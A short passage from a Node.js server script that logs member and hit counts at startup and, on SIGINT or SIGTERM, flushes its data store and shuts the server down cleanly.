  console.log(`[syn] ${store.raw().users.length} members, ${store.raw().hits.length} hits`);
});

for (const sig of ['SIGINT', 'SIGTERM']) {
  process.on(sig, () => {
    store.flush();
    server.close(() => process.exit(0));
    setTimeout(() => process.exit(0), 500);
  });
}
